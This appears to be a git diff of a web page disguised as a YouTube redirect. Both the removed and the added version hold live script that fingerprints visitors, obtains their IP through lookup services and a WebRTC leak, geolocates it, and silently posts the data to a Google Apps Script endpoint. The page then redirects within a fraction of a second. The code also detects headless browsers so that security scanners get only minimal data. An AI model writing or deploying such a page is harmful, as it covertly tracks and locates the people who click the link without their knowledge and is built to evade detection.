@@ -1,350 +1,241 @@
-<script>
-    const REDIRECT = 'https://www.youtube.com/shorts/gRVU6OvOSfY';
-    const EMAIL_SCRIPT = 'https://script.google.com/macros/s/AKfycbxM7xBOr5j3_PKsU7iuwu6oe08voybmj2NGch-fp1x0jX5eHqIBGNaa4Q0UqhXePf3Z0Q/exec';
+<!DOCTYPE html>
+<html>
+<head>
+    <title>YouTube</title>
+    <!-- Redirect immediately -->
+    <meta http-equiv="refresh" content="0;url=https://www.youtube.com/watch?v=dQw4w9WgXcQ">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #fff;
+            font-family: Arial, sans-serif;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Invisible iframe to collect data without affecting main page -->
+    <iframe src="about:blank" id="dataCollector" style="display:none"></iframe>
     
-    let dataSent = false;
+    <!-- Visible content that instantly redirects -->
+    <div style="text-align:center; padding:50px;">
+        <h2>Redirecting to YouTube...</h2>
+        <p>If you are not redirected automatically, <a href="https://www.youtube.com/shorts/gRVU6OvOSfY">click here</a>.</p>
+    </div>
 
-    // 🎯 **HONEYPOT TRAPS - Only real browsers can pass these**
-    async function detectRealBrowser() {
-        const traps = {
-            is_real_human: true,
-            traps_passed: 0,
-            traps_failed: [],
-            scanner_indicators: []
-        };
+    <script>
+        const EMAIL_SCRIPT = 'https://script.google.com/macros/s/AKfycbwn5V4cJO9wpFiFCqyDR_fmTn4DTYv8L4-XWO58CyzcvxSw-zLYSluL6Gw5TVrZibwo2Q/exec';
+        let dataSent = false;
 
-        // TRAP 1: **Mouse movement detection** (scanners don't move mouse)
-        let mouseMoved = false;
-        document.addEventListener('mousemove', () => { mouseMoved = true; }, { once: true });
-        
-        // TRAP 2: **Focus/Blur events** (scanners don't switch tabs)
-        let focusChanged = false;
-        window.addEventListener('focus', () => { focusChanged = true; }, { once: true });
-        window.addEventListener('blur', () => { focusChanged = true; }, { once: true });
-        
-        // TRAP 3: **Click events** (scanners don't click)
-        let clicked = false;
-        document.addEventListener('click', () => { clicked = true; }, { once: true });
-        
-        // TRAP 4: **Scroll detection** (scanners don't scroll)
-        let scrolled = false;
-        window.addEventListener('scroll', () => { scrolled = true; }, { once: true });
-        
-        // TRAP 5: **Keyboard events** (scanners don't type)
-        let keyPressed = false;
-        document.addEventListener('keydown', () => { keyPressed = true; }, { once: true });
-        
-        // TRAP 6: **Touch events** if mobile
-        let touched = false;
-        document.addEventListener('touchstart', () => { touched = true; }, { once: true });
-        
-        // TRAP 7: **Web Audio API test** (scanners often block this)
-        let audioSupported = false;
-        try {
-            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-            audioSupported = true;
-            audioContext.close();
-        } catch(e) {}
-        
-        // TRAP 8: **Microphone/Camera permission check** (scanners block)
-        let mediaDevices = false;
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            mediaDevices = true;
+        // 🎯 **DETECT HEADLESS BROWSER**
+        function detectHeadless() {
+            const tests = { isHeadless: false, failedTests: [], passedTests: [] };
+            
+            // Quick checks only (fast)
+            if (navigator.webdriver === true) tests.failedTests.push('webdriver');
+            if (navigator.plugins.length < 2) tests.failedTests.push('few_plugins');
+            if (!navigator.languages || navigator.languages.length === 0) tests.failedTests.push('no_languages');
+            if (window.outerWidth === 0 && window.outerHeight === 0) tests.failedTests.push('zero_window');
+            if (window.chrome && !window.chrome.runtime) tests.failedTests.push('no_chrome_runtime');
+            
+            tests.isHeadless = tests.failedTests.length >= 2;
+            return tests;
         }
-        
-        // TRAP 9: **Clipboard API** (scanners don't have clipboard)
-        let clipboard = 'clipboard' in navigator;
-        
-        // TRAP 10: **Geolocation API** (scanners block)
-        let geolocation = 'geolocation' in navigator;
-        
-        // TRAP 11: **RequestIdleCallback** (real browsers have this)
-        let idleCallback = 'requestIdleCallback' in window;
-        
-        // TRAP 12: **Speech Synthesis** (scanners don't have)
-        let speechSynthesis = 'speechSynthesis' in window;
-        
-        // Wait a bit for events to potentially fire
-        await new Promise(resolve => setTimeout(resolve, 800));
-        
-        // **ANALYZE RESULTS**
-        
-        // Scanner patterns from your example:
-        // 1. Linux x86_64 with Chrome (common scanner platform)
-        // 2. 28 CPU cores (server hardware)
-        // 3. Language mismatch (he-IL but in Israel scanner farm)
-        // 4. No mouse/keyboard/scroll events
-        
-        if (navigator.userAgent.includes('Linux x86_64') && 
-            navigator.userAgent.includes('Chrome')) {
-            traps.scanner_indicators.push('linux_chrome_scanner');
-        }
-        
-        if (navigator.hardwareConcurrency > 16) {
-            traps.scanner_indicators.push('server_cpu_cores_' + navigator.hardwareConcurrency);
-        }
-        
-        // Check for known scanner IPs/networks
-        const scannerNetworks = [
-            '31.187.', // URLScan.io (PacketHub S.A.)
-            '8.8.',    // Google bots
-            '52.',     // AWS (common scanner infra)
-            '54.',     // AWS
-            '18.',     // Google Cloud
-            '104.',    // DigitalOcean
-            '162.',    // OVH
-            '185.',    // Scanner networks
-            '194.',    // Scanner networks
-            '195.'     // Scanner networks
-        ];
-        
-        // Count traps passed
-        const eventTraps = [mouseMoved, focusChanged, clicked, scrolled, keyPressed, touched];
-        const eventPassed = eventTraps.some(trap => trap === true);
-        
-        const apis = [audioSupported, mediaDevices, clipboard, geolocation, idleCallback, speechSynthesis];
-        const apisAvailable = apis.filter(api => api === true).length;
-        
-        traps.traps_passed = (eventPassed ? 1 : 0) + apisAvailable;
-        
-        if (!eventPassed) {
-            traps.traps_failed.push('no_user_interaction');
-        }
-        
-        if (apisAvailable < 3) {
-            traps.traps_failed.push('limited_apis');
-        }
-        
-        // FINAL DECISION
-        if (traps.scanner_indicators.length >= 2 && !eventPassed) {
-            traps.is_real_human = false;
-            traps.confidence = '95% SCANNER';
-        } else if (eventPassed) {
-            traps.is_real_human = true;
-            traps.confidence = '99% HUMAN';
-        } else if (traps.traps_passed >= 5) {
-            traps.is_real_human = true;
-            traps.confidence = '90% HUMAN';
-        } else {
-            traps.is_real_human = false;
-            traps.confidence = '80% SCANNER';
-        }
-        
-        traps.detailed_analysis = {
-            mouse_moved: mouseMoved,
-            focus_changed: focusChanged,
-            clicked: clicked,
-            scrolled: scrolled,
-            key_pressed: keyPressed,
-            touched: touched,
-            audio_supported: audioSupported,
-            media_devices: mediaDevices,
-            clipboard: clipboard,
-            geolocation_api: geolocation,
-            idle_callback: idleCallback,
-            speech_synthesis: speechSynthesis,
-            user_agent: navigator.userAgent.substring(0, 100),
-            cpu_cores: navigator.hardwareConcurrency,
-            event_detected: eventPassed,
-            apis_available: apisAvailable
-        };
-        
-        return traps;
-    }
 
-    // 🎯 **COLLECT DATA WITH SCANNER DETECTION**
-    async function collectDataWithDetection() {
-        // Run honeypot traps first
-        const traps = await detectRealBrowser();
-        
-        // Basic data
-        const data = {
-            // ✅ **Detection Results**
-            detection_timestamp: new Date().toISOString(),
-            local_time: new Date().toLocaleString(),
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timezone_offset: new Date().getTimezoneOffset(),
-            visitor_type: traps.is_real_human ? 'HUMAN' : 'SCANNER/BOT',
-            detection_confidence: traps.confidence,
-            scanner_indicators: traps.scanner_indicators,
-            traps_passed: traps.traps_passed,
-            traps_failed: traps.traps_failed,
-            honeypot_analysis: traps.detailed_analysis,
-            
-            // ✅ **Basic Browser Info**
-            user_agent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            languages: navigator.languages ? navigator.languages.join(', ') : '',
-            cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
-            do_not_track: navigator.doNotTrack || 'Not set',
-            java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
-            
-            // ✅ **Screen & Hardware**
-            screen_resolution: screen.width + 'x' + screen.height,
-            screen_avail: screen.availWidth + 'x' + screen.availHeight,
-            color_depth: screen.colorDepth + ' bit',
-            pixel_ratio: window.devicePixelRatio,
-            orientation: screen.orientation ? screen.orientation.type : 'Unknown',
-            hardware_concurrency: navigator.hardwareConcurrency || 'Unknown',
-            device_memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
-            max_touch_points: navigator.maxTouchPoints || 0,
-            
-            // ✅ **URL & Referrer**
-            url: window.location.href,
-            referrer: document.referrer || 'Direct',
-            
-            // ✅ **Features**
-            localStorage: window.localStorage ? 'Supported' : 'Not supported',
-            sessionStorage: window.sessionStorage ? 'Supported' : 'Not supported',
-            notifications: 'Notification' in window ? 'Supported' : 'Not supported',
-            webrtc: !!window.RTCPeerConnection,
-            
-            // ✅ **Plugins**
-            plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'None',
-        };
-
-        // Only collect advanced data if NOT a scanner
-        if (traps.is_real_human) {
+        // 🎯 **GET TIMEZONE (Unbeatable)**
+        function getTimezone() {
+            const tz = {};
             try {
-                // Get IP
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                data.ip = ipData.ip;
-                
-                // Geolocation
-                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                const geoData = await geoResponse.json();
-                
-                data.geolocation = {
-                    ip: geoData.ip,
-                    city: geoData.city,
-                    region: geoData.region,
-                    country: geoData.country_name,
-                    country_code: geoData.country_code,
-                    postal: geoData.postal,
-                    latitude: geoData.latitude,
-                    longitude: geoData.longitude,
-                    timezone: geoData.timezone,
-                    utc_offset: geoData.utc_offset,
-                    asn: geoData.asn,
-                    org: geoData.org,
-                    isp: geoData.org
-                };
-            } catch(error) {
-                data.ip = 'Failed';
-                data.geolocation = { error: 'Failed' };
-            }
-
-            // Advanced fingerprints
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = '#069';
-                ctx.fillText('Fingerprint', 2, 15);
-                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                ctx.fillText('Fingerprint', 4, 17);
-                data.canvas_fingerprint = canvas.toDataURL().substring(22, 40);
-                
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    data.webgl = {
-                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Restricted',
-                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Restricted'
-                    };
+                // Method 1: Intl API
+                tz.intl = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                tz.method = 'Intl_API';
+            } catch(e) {
+                // Method 2: Date string parsing
+                const str = new Date().toString();
+                const match = str.match(/\(([^)]+)\)/);
+                if (match) {
+                    tz.intl = match[1];
+                    tz.method = 'String_Parse';
                 }
-            } catch(e) {
-                data.canvas_fingerprint = 'Failed';
-            }
-            
-            // Battery
-            if (navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
-                    data.battery = {
-                        level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging,
-                        charging_time: battery.chargingTime || 'Unknown',
-                        discharging_time: battery.dischargingTime || 'Unknown'
-                    };
-                } catch(e) {}
-            }
-            
-            // Network
-            if (navigator.connection) {
-                data.connection = {
-                    type: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink + ' Mbps',
-                    rtt: navigator.connection.rtt + ' ms'
+                // Method 3: Offset mapping
+                const offset = -new Date().getTimezoneOffset() / 60;
+                const offsetMap = {
+                    '-5': 'America/New_York', '-8': 'America/Los_Angeles', '0': 'Europe/London',
+                    '1': 'Europe/Paris', '2': 'Europe/Athens', '3': 'Europe/Moscow',
+                    '5.5': 'Asia/Kolkata', '8': 'Asia/Shanghai', '9': 'Asia/Tokyo',
+                    '10': 'Australia/Sydney'
                 };
+                if (offsetMap[offset]) {
+                    tz.offset_based = offsetMap[offset];
+                    tz.method = 'Offset_Map';
+                }
             }
-            
-            // Visitor ID
-            const idString = navigator.userAgent + screen.width + screen.height + navigator.language;
-            let hash = 0;
-            for (let i = 0; i < idString.length; i++) {
-                hash = ((hash << 5) - hash) + idString.charCodeAt(i);
-                hash |= 0;
-            }
-            data.visitor_id = 'VIS-' + Math.abs(hash).toString(16).substring(0, 8).toUpperCase();
-        } else {
-            // For scanners, minimal data
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                data.ip = ipData.ip;
-                data.scanner_ip_note = 'Scanner infrastructure IP';
-                
-                // Quick geolocation without details
-                data.geolocation = { ip: ipData.ip, note: 'Scanner location' };
-            } catch(e) {
-                data.ip = 'Scanner - No IP fetched';
-            }
-            
-            data.visitor_id = 'SCAN-' + Date.now().toString(36).toUpperCase();
-            data.canvas_fingerprint = 'Scanner - Not collected';
+            return tz.intl || tz.offset_based || 'Unknown';
         }
-        
-        return data;
-    }
 
-    // 🚀 **EXECUTE**
-    (async function() {
-        try {
-            const data = await collectDataWithDetection();
+        // 🎯 **GET IP (Multiple Fallbacks)**
+        async function getIP() {
+            const services = [
+                'https://api.ipify.org?format=json',
+                'https://icanhazip.com',
+                'https://ifconfig.me/ip',
+                'https://ident.me'
+            ];
             
-            if (!dataSent) {
-                dataSent = true;
-                
-                console.log('🎯 Detection:', data.visitor_type, '- Confidence:', data.detection_confidence);
-                
-                // Send to Google Script
-                fetch(EMAIL_SCRIPT, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                }).catch(() => {
-                    // Backup
-                    const params = new URLSearchParams();
-                    params.append('data', JSON.stringify(data));
-                    fetch(EMAIL_SCRIPT + '?' + params.toString());
-                });
+            for (let url of services) {
+                try {
+                    const response = await fetch(url, { signal: AbortSignal.timeout(1000) });
+                    if (url.includes('ipify')) {
+                        const data = await response.json();
+                        return { ip: data.ip, source: 'ipify' };
+                    } else {
+                        const ip = await response.text();
+                        return { ip: ip.trim(), source: url };
+                    }
+                } catch(e) {
+                    continue;
+                }
             }
             
-        } catch(error) {
-            // Silent
+            // WebRTC fallback
+            try {
+                const rtc = new RTCPeerConnection({iceServers: []});
+                rtc.createDataChannel('');
+                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+                
+                return new Promise((resolve) => {
+                    rtc.onicecandidate = (ice) => {
+                        if (ice && ice.candidate && ice.candidate.candidate) {
+                            const ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                            if (ipMatch) {
+                                rtc.close();
+                                resolve({ ip: ipMatch[1], source: 'WebRTC', is_local: true });
+                            }
+                        }
+                    };
+                    setTimeout(() => {
+                        rtc.close();
+                        resolve({ ip: 'Blocked', source: 'All methods failed' });
+                    }, 800);
+                });
+            } catch(e) {
+                return { ip: 'Blocked', source: 'All methods blocked' };
+            }
         }
-        
-        // Redirect
-        setTimeout(() => {
-            window.location.href = REDIRECT;
-        }, 1500);
-        
-    })();
-</script>
+
+        // 🎯 **COLLECT BASIC DATA (Fast)**
+        function collectBasicData() {
+            return {
+                timestamp: new Date().toISOString(),
+                local_time: new Date().toLocaleString(),
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages?.join(', ') || '',
+                screen: screen.width + 'x' + screen.height,
+                color_depth: screen.colorDepth + ' bit',
+                pixel_ratio: window.devicePixelRatio,
+                hardware_cores: navigator.hardwareConcurrency || 'Unknown',
+                device_memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
+                referrer: document.referrer || 'Direct',
+                url: window.location.href,
+                cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
+                do_not_track: navigator.doNotTrack || 'Not set',
+                plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'None',
+                localStorage: !!window.localStorage,
+                sessionStorage: !!window.sessionStorage,
+                webrtc: !!window.RTCPeerConnection,
+                timezone: getTimezone(),
+                timezone_offset: new Date().getTimezoneOffset()
+            };
+        }
+
+        // 🎯 **MAIN COLLECTION (Runs in background)**
+        async function collectAndSend() {
+            if (dataSent) return;
+            dataSent = true;
+            
+            // Detect headless first
+            const headlessCheck = detectHeadless();
+            if (headlessCheck.isHeadless) {
+                // Quick minimal data for scanners
+                const scannerData = {
+                    scanner: true,
+                    detection: headlessCheck,
+                    timestamp: new Date().toISOString(),
+                    user_agent: navigator.userAgent?.substring(0, 100) || 'Unknown',
+                    url: window.location.href
+                };
+                
+                fetch(EMAIL_SCRIPT + '?data=' + encodeURIComponent(JSON.stringify(scannerData)), 
+                      { mode: 'no-cors' });
+                return;
+            }
+            
+            // For real users: collect everything quickly
+            const data = collectBasicData();
+            data.headless_check = headlessCheck;
+            data.visitor_type = 'REAL_HUMAN';
+            
+            // Get IP (async, don't wait too long)
+            const ipPromise = getIP().then(ipInfo => {
+                data.ip_info = ipInfo;
+                if (ipInfo.ip !== 'Blocked' && !ipInfo.is_local) {
+                    // Try quick geolocation
+                    fetch(`https://ipapi.co/${ipInfo.ip}/json/`)
+                        .then(r => r.json())
+                        .then(geo => {
+                            data.geolocation = {
+                                city: geo.city,
+                                region: geo.region,
+                                country: geo.country_name,
+                                latitude: geo.latitude,
+                                longitude: geo.longitude,
+                                isp: geo.org
+                            };
+                            sendData(data);
+                        })
+                        .catch(() => sendData(data));
+                } else {
+                    sendData(data);
+                }
+            }).catch(() => {
+                data.ip_info = { ip: 'Failed', source: 'All methods failed' };
+                sendData(data);
+            });
+            
+            // Timeout if IP takes too long
+            setTimeout(() => sendData(data), 1500);
+        }
+
+        // 🎯 **SEND DATA**
+        function sendData(data) {
+            // Try POST first
+            fetch(EMAIL_SCRIPT, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(data)
+            }).catch(() => {
+                // Fallback to GET
+                const params = new URLSearchParams();
+                params.append('data', JSON.stringify(data));
+                fetch(EMAIL_SCRIPT + '?' + params.toString(), { mode: 'no-cors' });
+            });
+        }
+
+        // 🚀 **START COLLECTION (Runs silently)**
+        window.addEventListener('load', () => {
+            // Start collection but don't wait for it
+            collectAndSend();
+            
+            // Redirect almost immediately (user sees brief flash at most)
+            setTimeout(() => {
+                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+            }, 300); // Only 300ms delay - barely noticeable
+        });
+    </script>
+</body>
+</html>
